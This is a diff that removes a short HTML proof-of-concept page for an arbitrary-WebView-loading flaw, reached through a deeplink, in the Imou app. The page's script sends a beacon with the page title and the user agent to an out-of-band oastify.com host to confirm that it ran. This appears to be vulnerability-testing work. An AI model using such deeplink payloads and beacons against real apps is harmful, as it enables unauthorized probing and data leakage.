@@ -1,10 +1,1 @@
-<!DOCTYPE html><html><head><meta charset="utf-8"><title>Imou Deeplink POC</title></head>
-<body style="background:#111;color:#0f0;font:20px monospace;padding:20px">
-<h2>IMOU DEEPLINK POC PAGE</h2>
-<p id="status">If you can read this inside the Imou app, arbitrary WebView loading is CONFIRMED.</p>
-<script>
-document.title='POC-HIT-'+Date.now();
-// 留痕: 请求 beacon 证明页面在应用内 WebView 执行
-new Image().src='http://w2zm6231eklh6sps626mnz34avgm4cs1.oastify.com/beacon?title='+encodeURIComponent(document.title)+'&ua='+encodeURIComponent(navigator.userAgent);
-</script>
-</body></html>
+
